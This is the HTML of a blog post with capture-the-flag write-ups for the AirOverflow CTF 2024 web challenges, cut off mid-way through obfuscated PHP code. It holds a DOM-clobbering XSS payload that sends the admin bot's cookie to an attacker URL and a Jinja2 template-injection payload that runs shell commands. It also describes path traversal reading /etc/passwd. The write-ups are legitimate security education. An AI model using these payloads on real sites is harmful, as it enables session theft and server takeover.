@@ -1,0 +1,810 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>AirOverflow CTF 2024 - Web Write-ups - Saad Akhtar</title><meta name="Description" content="Write-ups for all the web challenges of AirOverflow CTF."><meta property="og:title" content="AirOverflow CTF 2024 - Web Write-ups" />
+<meta property="og:description" content="Write-ups for all the web challenges of AirOverflow CTF." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="/airoverflow-ctf-2024/" /><meta property="og:image" content="/airoverflow-ctf-2024/0.png"/><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2024-04-28T11:00:21+05:00" />
+<meta property="article:modified_time" content="2024-04-28T11:00:21+05:00" /><meta property="og:site_name" content="Saad Akhtar" />
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="/airoverflow-ctf-2024/0.png"/>
+<meta name="twitter:title" content="AirOverflow CTF 2024 - Web Write-ups"/>
+<meta name="twitter:description" content="Write-ups for all the web challenges of AirOverflow CTF."/>
+<meta name="application-name" content="Saad Akhtar">
+<meta name="apple-mobile-web-app-title" content="Saad Akhtar"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="icon" href="favicon.svg"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="/airoverflow-ctf-2024/" /><link rel="prev" href="/hackthebox-analytics/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css"></noscript><link rel="preload" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css"></noscript><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "AirOverflow CTF 2024 - Web Write-ups",
+        "inLanguage": "en",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "\/airoverflow-ctf-2024\/"
+        },"image": [{
+                            "@type": "ImageObject",
+                            "url": "\/airoverflow-ctf-2024\/0.png",
+                            "width":  963 ,
+                            "height":  432 
+                        }],"genre": "posts","keywords": "cryptohack, challenges","wordcount":  1767 ,
+        "url": "\/airoverflow-ctf-2024\/","datePublished": "2024-04-28T11:00:21+05:00","dateModified": "2024-04-28T11:00:21+05:00","license": "This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher": {
+            "@type": "Organization",
+            "name": "","logo": "\/images\/avatar.png"},"author": {
+                "@type": "Person",
+                "name": "Saad Akhtar"
+            },"description": "Write-ups for all the web challenges of AirOverflow CTF."
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="Saad Akhtar"><span class="header-title-pre">> root@</span>ssaadakhtarr<span class="header-title-post">#</span></a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> Posts </a><a class="menu-item" href="/tags/"> Tags </a><a class="menu-item" href="/categories/"> Categories </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+                </a>
+            </div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="Saad Akhtar"><span class="header-title-pre">> root@</span>ssaadakhtarr<span class="header-title-post">#</span></a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        Cancel
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="">Posts</a><a class="menu-item" href="/tags/" title="">Tags</a><a class="menu-item" href="/categories/" title="">Categories</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+            </a></div>
+    </div>
+</header><div class="search-dropdown desktop">
+        <div id="search-dropdown-desktop"></div>
+    </div>
+    <div class="search-dropdown mobile">
+        <div id="search-dropdown-mobile"></div>
+    </div><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content always-active" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">AirOverflow CTF 2024 - Web Write-ups</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="https://ssaadakhtarr.github.io/" title="Author" target="_blank" rel="noopener noreffer author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Saad Akhtar</a></span>&nbsp;<span class="post-category">included in <a href="/categories/cryptohack/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>CryptoHack</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2024-04-28">2024-04-28</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;1767 words&nbsp;
+                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;9 minutes&nbsp;</div>
+        </div><div class="featured-image"><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/airoverflow-ctf-2024/0.png"
+        data-srcset="/airoverflow-ctf-2024/0.png, /airoverflow-ctf-2024/0.png 1.5x, /airoverflow-ctf-2024/0.png 2x"
+        data-sizes="auto"
+        alt="/airoverflow-ctf-2024/0.png"
+        title="Write-ups for all the web challenges of AirOverflow CTF." /></div><div class="details toc" id="toc-static"  data-kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#web">Web</a>
+      <ul>
+        <li><a href="#katana">Katana</a>
+          <ul>
+            <li><a href="#description">Description</a></li>
+            <li><a href="#vulnerability">Vulnerability</a></li>
+            <li><a href="#solution">Solution</a></li>
+          </ul>
+        </li>
+        <li><a href="#qrzilla">QrZilla</a>
+          <ul>
+            <li><a href="#description-1">Description</a></li>
+            <li><a href="#vulnerability-1">Vulnerability</a></li>
+            <li><a href="#solution-1">Solution</a></li>
+          </ul>
+        </li>
+        <li><a href="#musicoverflow2077">MusicOverflow2077</a>
+          <ul>
+            <li><a href="#description-2">Description</a></li>
+            <li><a href="#vulnerability-2">Vulnerability</a></li>
+            <li><a href="#solution-2">Solution</a></li>
+          </ul>
+        </li>
+        <li><a href="#feedback">Feedback</a>
+          <ul>
+            <li><a href="#description-3">Description</a></li>
+            <li><a href="#vulnerability-3">Vulnerability</a></li>
+            <li><a href="#solution-3">Solution</a></li>
+          </ul>
+        </li>
+        <li><a href="#little-nightmare">Little Nightmare</a>
+          <ul>
+            <li><a href="#description-4">Description</a></li>
+            <li><a href="#vulnerability-4">Vulnerability</a></li>
+            <li><a href="#solution-4">Solution</a></li>
+          </ul>
+        </li>
+        <li><a href="#streamify">Streamify</a>
+          <ul>
+            <li><a href="#description-5">Description</a></li>
+            <li><a href="#vulnerability-5">Vulnerability</a></li>
+            <li><a href="#solution-5">Solution</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><p>This post contains the write-ups for all the web challenges that I solved in AirOverflow CTF.</p>
+<h2 id="web">Web</h2>
+<h3 id="katana">Katana</h3>
+<h4 id="description">Description</h4>
+<p><figure><a class="lightgallery" href="/airoverflow-ctf-2024/1.png" title="&amp;ldquo;Katana Description&amp;rdquo;" data-thumbnail="/airoverflow-ctf-2024/1.png" data-sub-html="<h2>Katana Description</h2><p>&amp;ldquo;Katana Description&amp;rdquo;</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/airoverflow-ctf-2024/1.png"
+            data-srcset="/airoverflow-ctf-2024/1.png, /airoverflow-ctf-2024/1.png 1.5x, /airoverflow-ctf-2024/1.png 2x"
+            data-sizes="auto"
+            alt="/airoverflow-ctf-2024/1.png" width="483" height="489" />
+    </a><figcaption class="image-caption">Katana Description</figcaption>
+    </figure></p>
+<h4 id="vulnerability">Vulnerability</h4>
+<p>In this challenge, we need to trigger XSS, visit admin bot and steals its cookie. We&rsquo;ll use DOM Clobbering to enable XSS and then fetch the cookie from XSS.</p>
+<h4 id="solution">Solution</h4>
+<p>So the important part in the challenge is the following code.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="o">&lt;</span><span class="nx">script</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="kr">const</span> <span class="nx">urlParams</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">URLSearchParams</span><span class="p">(</span><span class="nb">window</span><span class="p">.</span><span class="nx">location</span><span class="p">.</span><span class="nx">search</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span><span class="p">(</span><span class="kd">var</span> <span class="p">[</span><span class="nx">key</span><span class="p">,</span> <span class="nx">value</span><span class="p">]</span> <span class="k">of</span> <span class="nx">urlParams</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="nx">key</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">        <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="nx">key</span><span class="p">).</span><span class="nx">innerText</span> <span class="o">=</span> <span class="sb">`</span><span class="si">${</span><span class="nx">value</span><span class="si">}</span><span class="sb">`</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="nb">window</span><span class="p">.</span><span class="nx">AOFCTF24</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="nb">document</span><span class="p">.</span><span class="nx">write</span><span class="p">(</span><span class="s2">&#34;unidentified keys &lt;br /&gt;&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">            <span class="nb">document</span><span class="p">.</span><span class="nx">write</span><span class="p">(</span><span class="sb">`</span><span class="si">${</span><span class="nx">key</span><span class="si">}</span><span class="sb"> = </span><span class="si">${</span><span class="nx">value</span><span class="si">}</span><span class="sb"> &lt;br /&gt;`</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="k">else</span>
+</span></span><span class="line"><span class="cl">        <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="nx">key</span> <span class="o">=</span> <span class="nx">DOMPurify</span><span class="p">.</span><span class="nx">sanitize</span><span class="p">(</span><span class="nx">key</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">            <span class="nb">document</span><span class="p">.</span><span class="nx">write</span><span class="p">(</span><span class="sb">`&lt;span style=&#39;color: red&#39;&gt;</span><span class="si">${</span><span class="nx">key</span><span class="si">}</span><span class="sb"> not found in the document&lt;/span&gt;&lt;br /&gt;`</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="err">/script&gt;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>It takes our query parameters from <code>window.location.search</code> and loop through each such that if the <code>key</code> is the same as the <code>id</code> of an element then it changes the <code>innerText</code> of that element. (No XSS here as <code>innerText</code> doesn&rsquo;t allow injecting HTML).</p>
+<p>Moving on, it checks for <code>window.AOFCTF24</code> and then uses <code>document.write</code> to print out our <code>key</code> and <code>value</code>. There&rsquo;s some potential XSS as <code>document.write</code> would allow injecting HTML and JavaScript. But this condition won&rsquo;t be true normally as <code>window.AOFCTF24</code> is not defined.</p>
+<p>Finally, in the <code>else</code> part, it applies <code>DOMPurify</code> to our <code>key</code> and prints it out with <code>document.write</code>. Possible XSS here as well due to the usage of <code>document.write</code> but since it&rsquo;s using <code>DOMPurify</code> that doesn&rsquo;t seem to be the case.</p>
+<p>So the workaround is to inject some HTML through the <code>else</code> part such that we make <code>window.AOFCTF24</code> something other than <code>undefined</code> so in the next loop, we can inject the XSS in the <code>else if</code> part.</p>
+<div class="details admonition tip open">
+        <div class="details-summary admonition-title">
+            <i class="icon fas fa-lightbulb fa-fw" aria-hidden="true"></i>DOM Clobbering<i class="details-icon fas fa-angle-right fa-fw" aria-hidden="true"></i>
+        </div>
+        <div class="details-content">
+            <div class="admonition-content">DOM clobbering is a technique in which you inject HTML into a page to manipulate the DOM and ultimately change the behavior of JavaScript on the page. DOM clobbering is particularly useful in cases where XSS is not possible, but you can control some HTML on a page where the attributes id or name are whitelisted by the HTML filter. The most common form of DOM clobbering uses an anchor element to overwrite a global variable, which is then used by the application in an unsafe way, such as generating a dynamic script URL.</div>
+        </div>
+    </div>
+<p>Source: <a href="https://portswigger.net/web-security/dom-based/dom-clobbering" target="_blank" rel="noopener noreffer ">https://portswigger.net/web-security/dom-based/dom-clobbering</a></p>
+<p>We can inject a payload like following.</p>
+<p>Payload for DOM Clobbering: <code>&lt;a id%3dAOFCTF24&gt;&lt;a id%3dAOFCTF24 name%3durl href%3dhttp://test.com/test.js&gt;</code></p>
+<p>This would make the <code>window.AOFCTF</code> condition true in our <code>else if</code> part. So for the next loop, we can inject the XSS Payload as follows.</p>
+<p>Payload for XSS: <code>&amp;test=&lt;img src=x onerror=fetch('&lt;your-web-url&gt;?test'.concat(document.cookie));&gt;</code></p>
+<p>So the final payload would look like this.</p>
+<p>Final Payload: <code>http://challs.airoverflow.com:33878?DOM=test&amp;&lt;a id%3dAOFCTF24&gt;&lt;a id%3dAOFCTF24 name%3durl href%3dhttp://test.com/test.js&gt;&amp;test=&lt;img src=x onerror=fetch('&lt;your-web-url&gt;?test'.concat(document.cookie));&gt;</code></p>
+<p>Send this with admin bot and we&rsquo;ll get our flag in the admin&rsquo;s cookie.</p>
+<p><figure><a class="lightgallery" href="/airoverflow-ctf-2024/2.png" title="&amp;ldquo;Flag for katana&amp;rdquo;" data-thumbnail="/airoverflow-ctf-2024/2.png" data-sub-html="<h2>Flag for katana</h2><p>&amp;ldquo;Flag for katana&amp;rdquo;</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/airoverflow-ctf-2024/2.png"
+            data-srcset="/airoverflow-ctf-2024/2.png, /airoverflow-ctf-2024/2.png 1.5x, /airoverflow-ctf-2024/2.png 2x"
+            data-sizes="auto"
+            alt="/airoverflow-ctf-2024/2.png" width="678" height="381" />
+    </a><figcaption class="image-caption">Flag for katana</figcaption>
+    </figure></p>
+<h3 id="qrzilla">QrZilla</h3>
+<h4 id="description-1">Description</h4>
+<p><figure><a class="lightgallery" href="/airoverflow-ctf-2024/3.png" title="&amp;ldquo;QrZilla Description&amp;rdquo;" data-thumbnail="/airoverflow-ctf-2024/3.png" data-sub-html="<h2>QrZilla Description</h2><p>&amp;ldquo;QrZilla Description&amp;rdquo;</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/airoverflow-ctf-2024/3.png"
+            data-srcset="/airoverflow-ctf-2024/3.png, /airoverflow-ctf-2024/3.png 1.5x, /airoverflow-ctf-2024/3.png 2x"
+            data-sizes="auto"
+            alt="/airoverflow-ctf-2024/3.png" width="422" height="419" />
+    </a><figcaption class="image-caption">QrZilla Description</figcaption>
+    </figure></p>
+<h4 id="vulnerability-1">Vulnerability</h4>
+<p>In this challenge, we have a QR converter, we enter a text and it converts it into QR Code and vice versa. The vulnerability here is Server-Side Template Injection (SSTI) in which we can enter SSTI payload as text and convert it into QR Code, later scanning the same QR from the website the SSTI payload gets executed.</p>
+<h4 id="solution-1">Solution</h4>
+<p>The funcitonality is simple, we&rsquo;re given an input box to enter some text and it&rsquo;ll convert it into QR Code.</p>
+<p><figure><a class="lightgallery" href="/airoverflow-ctf-2024/5.png" title="&amp;ldquo;QR text&amp;rdquo;" data-thumbnail="/airoverflow-ctf-2024/5.png" data-sub-html="<h2>QR text</h2><p>&amp;ldquo;QR text&amp;rdquo;</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/airoverflow-ctf-2024/5.png"
+            data-srcset="/airoverflow-ctf-2024/5.png, /airoverflow-ctf-2024/5.png 1.5x, /airoverflow-ctf-2024/5.png 2x"
+            data-sizes="auto"
+            alt="/airoverflow-ctf-2024/5.png" width="1366" height="578" />
+    </a><figcaption class="image-caption">QR text</figcaption>
+    </figure></p>
+<p><figure><a class="lightgallery" href="/airoverflow-ctf-2024/4.png" title="&amp;ldquo;QR generated&amp;rdquo;" data-thumbnail="/airoverflow-ctf-2024/4.png" data-sub-html="<h2>QR generated</h2><p>&amp;ldquo;QR generated&amp;rdquo;</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/airoverflow-ctf-2024/4.png"
+            data-srcset="/airoverflow-ctf-2024/4.png, /airoverflow-ctf-2024/4.png 1.5x, /airoverflow-ctf-2024/4.png 2x"
+            data-sizes="auto"
+            alt="/airoverflow-ctf-2024/4.png" width="1366" height="573" />
+    </a><figcaption class="image-caption">QR generated</figcaption>
+    </figure></p>
+<p>Next feature, is we can enter a QR link and it&rsquo;ll convert it back to text for us.</p>
+<p><figure><a class="lightgallery" href="/airoverflow-ctf-2024/6.png" title="&amp;ldquo;QR Scanner&amp;rdquo;" data-thumbnail="/airoverflow-ctf-2024/6.png" data-sub-html="<h2>QR Scanner</h2><p>&amp;ldquo;QR Scanner&amp;rdquo;</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/airoverflow-ctf-2024/6.png"
+            data-srcset="/airoverflow-ctf-2024/6.png, /airoverflow-ctf-2024/6.png 1.5x, /airoverflow-ctf-2024/6.png 2x"
+            data-sizes="auto"
+            alt="/airoverflow-ctf-2024/6.png" width="1366" height="587" />
+    </a><figcaption class="image-caption">QR Scanner</figcaption>
+    </figure></p>
+<p><figure><a class="lightgallery" href="/airoverflow-ctf-2024/7.png" title="&amp;ldquo;Result&amp;rdquo;" data-thumbnail="/airoverflow-ctf-2024/7.png" data-sub-html="<h2>Result</h2><p>&amp;ldquo;Result&amp;rdquo;</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/airoverflow-ctf-2024/7.png"
+            data-srcset="/airoverflow-ctf-2024/7.png, /airoverflow-ctf-2024/7.png 1.5x, /airoverflow-ctf-2024/7.png 2x"
+            data-sizes="auto"
+            alt="/airoverflow-ctf-2024/7.png" width="1366" height="587" />
+    </a><figcaption class="image-caption">Result</figcaption>
+    </figure></p>
+<p>Since it&rsquo;s returning our input, let&rsquo;s try injecting some SSTI in it.</p>
+<p><figure><a class="lightgallery" href="/airoverflow-ctf-2024/8.png" title="&amp;ldquo;injecting ssti&amp;rdquo;" data-thumbnail="/airoverflow-ctf-2024/8.png" data-sub-html="<h2>injecting ssti</h2><p>&amp;ldquo;injecting ssti&amp;rdquo;</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/airoverflow-ctf-2024/8.png"
+            data-srcset="/airoverflow-ctf-2024/8.png, /airoverflow-ctf-2024/8.png 1.5x, /airoverflow-ctf-2024/8.png 2x"
+            data-sizes="auto"
+            alt="/airoverflow-ctf-2024/8.png" width="1366" height="575" />
+    </a><figcaption class="image-caption">injecting ssti</figcaption>
+    </figure></p>
+<p><figure><a class="lightgallery" href="/airoverflow-ctf-2024/9.png" title="&amp;ldquo;ssti worked&amp;rdquo;" data-thumbnail="/airoverflow-ctf-2024/9.png" data-sub-html="<h2>ssti worked</h2><p>&amp;ldquo;ssti worked&amp;rdquo;</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/airoverflow-ctf-2024/9.png"
+            data-srcset="/airoverflow-ctf-2024/9.png, /airoverflow-ctf-2024/9.png 1.5x, /airoverflow-ctf-2024/9.png 2x"
+            data-sizes="auto"
+            alt="/airoverflow-ctf-2024/9.png" width="1366" height="576" />
+    </a><figcaption class="image-caption">ssti worked</figcaption>
+    </figure></p>
+<p>So since the it returned <code>49</code> this confirmed the SSTI. Now let&rsquo;s try inject some Jinja2 payload to get RCE and read the flag.</p>
+<p>Payload: <code>{{ self.__init__.__globals__.__builtins__.__import__('os').popen('cat /flag.txt').read() }}</code></p>
+<p><figure><a class="lightgallery" href="/airoverflow-ctf-2024/10.png" title="&amp;ldquo;generating qr to read the flag&amp;rdquo;" data-thumbnail="/airoverflow-ctf-2024/10.png" data-sub-html="<h2>generating qr to read the flag</h2><p>&amp;ldquo;generating qr to read the flag&amp;rdquo;</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/airoverflow-ctf-2024/10.png"
+            data-srcset="/airoverflow-ctf-2024/10.png, /airoverflow-ctf-2024/10.png 1.5x, /airoverflow-ctf-2024/10.png 2x"
+            data-sizes="auto"
+            alt="/airoverflow-ctf-2024/10.png" width="1366" height="582" />
+    </a><figcaption class="image-caption">generating qr to read the flag</figcaption>
+    </figure></p>
+<p><figure><a class="lightgallery" href="/airoverflow-ctf-2024/11.png" title="&amp;ldquo;reading the flag&amp;rdquo;" data-thumbnail="/airoverflow-ctf-2024/11.png" data-sub-html="<h2>reading the flag</h2><p>&amp;ldquo;reading the flag&amp;rdquo;</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/airoverflow-ctf-2024/11.png"
+            data-srcset="/airoverflow-ctf-2024/11.png, /airoverflow-ctf-2024/11.png 1.5x, /airoverflow-ctf-2024/11.png 2x"
+            data-sizes="auto"
+            alt="/airoverflow-ctf-2024/11.png" width="1366" height="578" />
+    </a><figcaption class="image-caption">reading the flag</figcaption>
+    </figure></p>
+<h3 id="musicoverflow2077">MusicOverflow2077</h3>
+<h4 id="description-2">Description</h4>
+<p><figure><a class="lightgallery" href="/airoverflow-ctf-2024/12.png" title="&amp;ldquo;musicoverflow2077 description&amp;rdquo;" data-thumbnail="/airoverflow-ctf-2024/12.png" data-sub-html="<h2>musicoverflow2077 description</h2><p>&amp;ldquo;musicoverflow2077 description&amp;rdquo;</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/airoverflow-ctf-2024/12.png"
+            data-srcset="/airoverflow-ctf-2024/12.png, /airoverflow-ctf-2024/12.png 1.5x, /airoverflow-ctf-2024/12.png 2x"
+            data-sizes="auto"
+            alt="/airoverflow-ctf-2024/12.png" width="413" height="440" />
+    </a><figcaption class="image-caption">musicoverflow2077 description</figcaption>
+    </figure></p>
+<h4 id="vulnerability-2">Vulnerability</h4>
+<p>There are two vulnerabilities here, first is Path Traversal through which we&rsquo;ll read the source code and then command injection by which we&rsquo;ll get a shell and read the flag.</p>
+<h4 id="solution-2">Solution</h4>
+<p>So the website shows a music player and each song is fetched via an API.</p>
+<p>Capture the API <code>/music.php?song=</code>, we can get the Path Traversal.</p>
+<p><figure><a class="lightgallery" href="/airoverflow-ctf-2024/13.png" title="&amp;ldquo;Reading the /etc/passwd with Path Traversal&amp;rdquo;" data-thumbnail="/airoverflow-ctf-2024/13.png" data-sub-html="<h2>Reading the /etc/passwd with Path Traversal</h2><p>&amp;ldquo;Reading the /etc/passwd with Path Traversal&amp;rdquo;</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/airoverflow-ctf-2024/13.png"
+            data-srcset="/airoverflow-ctf-2024/13.png, /airoverflow-ctf-2024/13.png 1.5x, /airoverflow-ctf-2024/13.png 2x"
+            data-sizes="auto"
+            alt="/airoverflow-ctf-2024/13.png" width="1362" height="522" />
+    </a><figcaption class="image-caption">Reading the /etc/passwd with Path Traversal</figcaption>
+    </figure></p>
+<p>Next, we can try reading the flag which should be at <code>/flag.txt</code> but in this challenge it&rsquo;s not with the same <code>flag.txt</code> name so, we need to get command injection somehow to read the flag.</p>
+<p>Next, we can try reading other files so let&rsquo;s try to read the <code>index.php</code> file.</p>
+<p><figure><a class="lightgallery" href="/airoverflow-ctf-2024/14.png" title="&amp;ldquo;Reading the index.php&amp;rdquo;" data-thumbnail="/airoverflow-ctf-2024/14.png" data-sub-html="<h2>Reading the index.php</h2><p>&amp;ldquo;Reading the index.php&amp;rdquo;</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/airoverflow-ctf-2024/14.png"
+            data-srcset="/airoverflow-ctf-2024/14.png, /airoverflow-ctf-2024/14.png 1.5x, /airoverflow-ctf-2024/14.png 2x"
+            data-sizes="auto"
+            alt="/airoverflow-ctf-2024/14.png" width="1353" height="524" />
+    </a><figcaption class="image-caption">Reading the index.php</figcaption>
+    </figure></p>
+<p>This may seem quite overwhelming with the obfuscated code, but breaking it down little by little makes it easier.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span> <span class="nv">$_</span><span class="o">=</span><span class="sb">``</span><span class="o">.</span><span class="p">[];</span><span class="nv">$__</span><span class="o">=@</span><span class="nv">$_</span><span class="p">;</span><span class="nv">$_</span><span class="o">=</span> <span class="nv">$__</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span> <span class="nv">$_1</span> <span class="o">=</span> <span class="nv">$__</span><span class="p">[</span><span class="mi">2</span><span class="p">];</span> <span class="nv">$_1</span><span class="o">++</span><span class="p">;</span><span class="nv">$_1</span><span class="o">++</span><span class="p">;</span><span class="nv">$_1</span><span class="o">++</span><span class="p">;</span><span class="nv">$_1</span><span class="o">++</span><span class="p">;</span><span class="nv">$_1</span><span class="o">++</span><span class="p">;</span><span class="nv">$_1</span><span class="o">++</span><span class="p">;</span><span class="nv">$_</span><span class="o">++</span><span class="p">;</span><span class="nv">$_</span><span class="o">++</span><span class="p">;</span><span class="nv">$_0</span> <span class="o">=</span> <span class="nv">$_</span><span class="p">;</span><span class="nv">$_</span><span class="o">++</span><span class="p">;</span><span class="nv">$_2</span> <span class="o">=</span> <span class="o">++</span><span class="nv">$_</span><span class="p">;</span> <span class="nv">$_55</span> <span class="o">=</span> <span class="s1">&#39;_&#39;</span><span class="o">.</span><span class="p">(</span><span class="s1">&#39;,&#39;</span><span class="o">^</span><span class="s1">&#39;|&#39;</span><span class="p">)</span><span class="o">.</span><span class="p">(</span><span 